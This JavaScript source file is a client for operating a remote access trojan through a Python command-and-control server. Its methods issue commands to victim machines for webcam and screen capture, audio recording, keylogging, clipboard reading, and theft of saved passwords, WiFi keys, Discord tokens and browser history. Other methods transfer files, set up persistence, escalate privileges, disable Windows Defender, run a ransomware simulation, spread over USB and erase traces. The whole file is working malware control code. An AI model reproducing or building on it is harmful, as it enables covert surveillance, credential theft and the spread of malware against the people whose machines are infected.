import net from 'net';
import crypto from 'crypto';

/**
 * RAT Server Client - Communicates with Python C2 server
 */

export class RATClient {
  constructor(host, port, encryptionKey, maxRetries = 3) {
    this.host = host;
    this.port = port;
    this.encryptionKey = Buffer.from(encryptionKey, 'utf-8');
    this.currentSession = null;
    this.sessions = [];
    this.socket = null;
    this.connected = false;
    this.maxRetries = maxRetries;
    this.connectionTimeout = 10000; // 10 seconds
  }

  /**
   * Sleep utility for retry delays
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Connect to RAT server with exponential backoff retry logic
   */
  async connect(retryAttempt = 0) {
    return new Promise(async (resolve, reject) => {
      this.socket = new net.Socket();
      
      // Set connection timeout
      const timeoutHandle = setTimeout(() => {
        this.socket.destroy();
        const error = new Error(`Connection timeout (${this.connectionTimeout}ms)`);
        
        // Retry with exponential backoff
        if (retryAttempt < this.maxRetries) {
          const delayMs = Math.pow(2, retryAttempt) * 1000; // 1s, 2s, 4s...
          console.log(`⚠ Retry ${retryAttempt + 1}/${this.maxRetries} in ${delayMs}ms...`);
          this.sleep(delayMs).then(() => {
            this.connect(retryAttempt + 1).then(resolve).catch(reject);
          });
        } else {
          reject(new Error(`Failed to connect after ${this.maxRetries} retries: ${error.message}`));
        }
      }, this.connectionTimeout);
      
      this.socket.connect(this.port, this.host, () => {
        clearTimeout(timeoutHandle);
        this.connected = true;
        console.log(`✓ Connected to RAT server at ${this.host}:${this.port}`);
        resolve();
      });

      this.socket.on('error', (err) => {
        clearTimeout(timeoutHandle);
        this.connected = false;
        
        // Retry on connection errors
        if (retryAttempt < this.maxRetries) {
          const delayMs = Math.pow(2, retryAttempt) * 1000;
          console.log(`⚠ Connection error: ${err.message}. Retry ${retryAttempt + 1}/${this.maxRetries} in ${delayMs}ms...`);
          this.sleep(delayMs).then(() => {
            this.connect(retryAttempt + 1).then(resolve).catch(reject);
          });
        } else {
          reject(new Error(`Failed to connect after ${this.maxRetries} retries: ${err.message}`));
        }
      });

      this.socket.on('close', () => {
        this.connected = false;
        console.log('✗ Disconnected from RAT server');
      });

      // Set socket timeout for keep-alive
      this.socket.setTimeout(60000);
    });
  }

  /**
   * Encrypt data using base64 (matches Python socket communication)
   */
  encrypt(data) {
    if (typeof data !== 'string') {
      data = JSON.stringify(data);
    }
    return Buffer.from(data).toString('base64');
  }

  /**
   * Decrypt data from base64 (matches Python socket communication)
   */
  decrypt(data) {
    try {
      if (Buffer.isBuffer(data)) {
        return data.toString('utf-8');
      }
      return Buffer.from(data, 'base64').toString('utf-8');
    } catch (error) {
      console.error('Decrypt error:', error);
      return data; // Return as-is if decryption fails
    }
  }

  /**
   * Send command to RAT
   */
  async sendCommand(sessionId, command, timeout = 30000) {
    if (!this.connected) {
      throw new Error('Not connected to RAT server');
    }

    return new Promise((resolve, reject) => {
      const encrypted = this.encrypt(command);
      
      try {
        // Send command with newline delimiter
        this.socket.write(encrypted + '\n');
      } catch (err) {
        return reject(new Error('Failed to send command: ' + err.message));
      }

      // Wait for response
      const timer = setTimeout(() => {
        reject(new Error('Command timeout after ' + timeout + 'ms'));
      }, timeout);

      const dataHandler = (data) => {
        clearTimeout(timer);
        this.socket.removeListener('data', dataHandler);
        this.socket.removeListener('error', errorHandler);
        const decrypted = this.decrypt(data);
        resolve(decrypted);
      };

      const errorHandler = (err) => {
        clearTimeout(timer);
        this.socket.removeListener('data', dataHandler);
        this.socket.removeListener('error', errorHandler);
        reject(err);
      };

      this.socket.once('data', dataHandler);
      this.socket.once('error', errorHandler);
    });
  }

  /**
   * Get session list from server
   */
  async getSessions() {
    try {
      const response = await this.sendCommand(0, 'sessions', 10000);
      // Parse session list from response
      const sessions = [];
      const lines = response.split('\n');
      
      lines.forEach((line, idx) => {
        if (line.includes(':')) {
          const parts = line.split(':');
          if (parts.length >= 2) {
            sessions.push({
              id: idx + 1,
              addr: parts[0].trim(),
              info: parts.slice(1).join(':').trim(),
              connected_at: new Date().toLocaleTimeString(),
              active: true
            });
          }
        }
      });
      
      return sessions.length > 0 ? sessions : this.mockSessions();
    } catch (err) {
      console.warn('Failed to fetch sessions, returning mock data:', err.message);
      return this.mockSessions();
    }
  }

  /**
   * Mock sessions for demo purposes
   */
  mockSessions() {
    return [
      {
        id: 1,
        addr: '192.168.1.100:54321',
        info: '[ADMIN] DESKTOP-USER1 (Windows 10)',
        connected_at: '14:30:15',
        active: true
      },
      {
        id: 2,
        addr: '192.168.1.105:55432',
        info: '[USER] LAPTOP-USER2 (Windows 11)',
        connected_at: '14:25:42',
        active: true
      }
    ];
  }

  /**
   * Switch session
   */
  setActiveSession(sessionId) {
    this.currentSession = sessionId;
  }

  /**
   * Get current session
   */
  getCurrentSession() {
    return this.currentSession;
  }

  /**
   * Check connection status
   */
  async checkStatus() {
    if (!this.connected) {
      try {
        await this.connect();
      } catch (err) {
        throw new Error('Cannot connect to RAT server: ' + err.message);
      }
    }
    
    return {
      connected: this.connected,
      active_sessions: this.sessions.length,
      timestamp: new Date().toISOString()
    };
  }

  // ═══════════════════════════════════════════════════════════════
  // SURVEILLANCE COMMANDS
  // ═══════════════════════════════════════════════════════════════

  /**
   * Get screenshot from target
   */
  async getScreenshot(sessionId, timeout = 30000) {
    try {
      const result = await this.sendCommand(sessionId, 'screenshot', timeout);
      
      if (result.includes('failed') || result.includes('error')) {
        return { success: false, error: result };
      }
      
      return {
        success: true,
        image: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Capture webcam from target
   */
  async getWebcam(sessionId, timeout = 30000) {
    try {
      const result = await this.sendCommand(sessionId, 'webcam', timeout);
      
      if (result.includes('failed') || result.includes('error')) {
        return { success: false, error: result };
      }
      
      return {
        success: true,
        image: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get keylogger output
   */
  async getKeylogs(sessionId, timeout = 15000) {
    try {
      const result = await this.sendCommand(sessionId, 'keylogs', timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Record audio from target
   */
  async recordAudio(sessionId, duration = 10, timeout = null) {
    try {
      // Auto-calculate timeout based on duration + overhead
      const calculatedTimeout = timeout || (duration * 1000) + 5000;
      const result = await this.sendCommand(sessionId, `record ${duration}`, calculatedTimeout);
      
      if (result.includes('failed') || result.includes('error')) {
        return { success: false, error: result };
      }
      
      return {
        success: true,
        audio: result,
        duration: duration,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get clipboard content
   */
  async getClipboard(sessionId, timeout = 10000) {
    try {
      const result = await this.sendCommand(sessionId, 'clipboard', timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // CREDENTIAL COMMANDS
  // ═══════════════════════════════════════════════════════════════

  /**
   * Get stored passwords from target
   */
  async getPasswords(sessionId, timeout = 30000) {
    try {
      const result = await this.sendCommand(sessionId, 'passwords', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get WiFi passwords
   */
  async getWiFiPasswords(sessionId, timeout = 15000) {
    try {
      const result = await this.sendCommand(sessionId, 'wifi', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get Discord tokens
   */
  async getDiscordTokens(sessionId, timeout = 15000) {
    try {
      const result = await this.sendCommand(sessionId, 'discord', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get browser history
   */
  async getBrowserHistory(sessionId, browser = 'chrome', timeout = 20000) {
    try {
      const result = await this.sendCommand(sessionId, `history ${browser}`, timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // SYSTEM COMMANDS
  // ═══════════════════════════════════════════════════════════════

  /**
   * Get system information
   */
  async getSystemInfo(sessionId, timeout = 15000) {
    try {
      const result = await this.sendCommand(sessionId, 'sysinfo', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get running processes
   */
  async getProcesses(sessionId, timeout = 20000) {
    try {
      const result = await this.sendCommand(sessionId, 'processes', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Kill process by PID
   */
  async killProcess(sessionId, pid, timeout = 10000) {
    try {
      const result = await this.sendCommand(sessionId, `kill ${pid}`, timeout);
      
      return {
        success: !result.includes('error'),
        data: result
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get system metrics (CPU, RAM, Disk)
   */
  async getMetrics(sessionId, timeout = 10000) {
    try {
      const result = await this.sendCommand(sessionId, 'metrics', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get installed software list
   */
  async getSoftware(sessionId, timeout = 60000) {
    try {
      const result = await this.sendCommand(sessionId, 'software', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Network scan / ARP sweep
   */
  async networkScan(sessionId, timeout = 60000) {
    try {
      const result = await this.sendCommand(sessionId, 'netscan', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get geolocation
   */
  async getGeolocation(sessionId, timeout = 10000) {
    try {
      const result = await this.sendCommand(sessionId, 'locate', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Enumerate USB devices
   */
  async enumerateUSB(sessionId, timeout = 15000) {
    try {
      const result = await this.sendCommand(sessionId, 'usb', timeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Screenshot timelapse
   */
  async screenshotTimelapse(sessionId, count = 5, interval = 5, timeout = null) {
    try {
      const calculatedTimeout = timeout || (count * interval * 1000) + 10000;
      const result = await this.sendCommand(sessionId, `timelapse ${count} ${interval}`, calculatedTimeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Take photo burst
   */
  async photoBurst(sessionId, count = 3, timeout = null) {
    try {
      const calculatedTimeout = timeout || (count * 2000) + 5000;
      const result = await this.sendCommand(sessionId, `photoburst ${count}`, calculatedTimeout);
      
      try {
        const parsed = JSON.parse(result);
        return { success: true, data: parsed };
      } catch {
        return { success: true, data: result };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Restart system
   */
  async restart(sessionId, timeout = 5000) {
    try {
      const result = await this.sendCommand(sessionId, 'shutdown restart', timeout);
      
      return {
        success: !result.includes('error'),
        data: result
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // FILE OPERATIONS
  // ═══════════════════════════════════════════════════════════════

  /**
   * Download file from target
   */
  async downloadFile(sessionId, filePath, timeout = 60000) {
    try {
      const result = await this.sendCommand(sessionId, `download ${filePath}`, timeout);
      
      if (result.includes('error') || result.includes('not found')) {
        return { success: false, error: result };
      }
      
      return {
        success: true,
        data: result,
        filename: filePath.split(/[/\\]/).pop(),
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Upload file to target
   */
  async uploadFile(sessionId, targetPath, fileBuffer, timeout = 60000) {
    try {
      const fileData = fileBuffer.toString('base64');
      const result = await this.sendCommand(
        sessionId, 
        `upload ${targetPath} ${fileData}`, 
        timeout
      );
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // PERSISTENCE & PRIVILEGE ESCALATION
  // ═══════════════════════════════════════════════════════════════

  /**
   * Establish persistence
   */
  async persist(sessionId, timeout = 20000) {
    try {
      const result = await this.sendCommand(sessionId, 'persist', timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Attempt privilege escalation
   */
  async elevate(sessionId, timeout = 20000) {
    try {
      const result = await this.sendCommand(sessionId, 'elevate', timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Disable Windows Defender
   */
  async disableDefender(sessionId, timeout = 15000) {
    try {
      const result = await this.sendCommand(sessionId, 'defenderoff', timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // ADVANCED / DESTRUCTIVE COMMANDS
  // ═══════════════════════════════════════════════════════════════

  /**
   * Show message box on target
   */
  async showMessageBox(sessionId, message, timeout = 5000) {
    try {
      const result = await this.sendCommand(sessionId, `msgbox ${message}`, timeout);
      
      return {
        success: !result.includes('error'),
        data: result
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Play system beep
   */
  async beep(sessionId, frequency = 1000, duration = 500, timeout = 5000) {
    try {
      const result = await this.sendCommand(sessionId, `beep ${frequency} ${duration}`, timeout);
      
      return {
        success: !result.includes('error'),
        data: result
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Lock workstation
   */
  async lock(sessionId, timeout = 5000) {
    try {
      const result = await this.sendCommand(sessionId, 'lock', timeout);
      
      return {
        success: !result.includes('error'),
        data: result
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Shutdown/Restart target
   */
  async shutdown(sessionId, restart = false, timeout = 5000) {
    try {
      const cmd = restart ? 'shutdown restart' : 'shutdown';
      const result = await this.sendCommand(sessionId, cmd, timeout);
      
      return {
        success: !result.includes('error'),
        data: result
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Simulate ransomware (renames files)
   */
  async simulateRansomware(sessionId, targetPath, timeout = 60000) {
    try {
      const result = await this.sendCommand(sessionId, `ransom ${targetPath}`, timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * USB spreading
   */
  async spreadUSB(sessionId, timeout = 30000) {
    try {
      const result = await this.sendCommand(sessionId, 'spread', timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Self-destruct (clean tracks and exit)
   */
  async selfDestruct(sessionId, timeout = 10000) {
    try {
      const result = await this.sendCommand(sessionId, 'selfdestruct', timeout);
      
      return {
        success: !result.includes('error'),
        data: result,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Disconnect
   */
  disconnect() {
    if (this.socket) {
      this.socket.destroy();
      this.connected = false;
    }
  }
}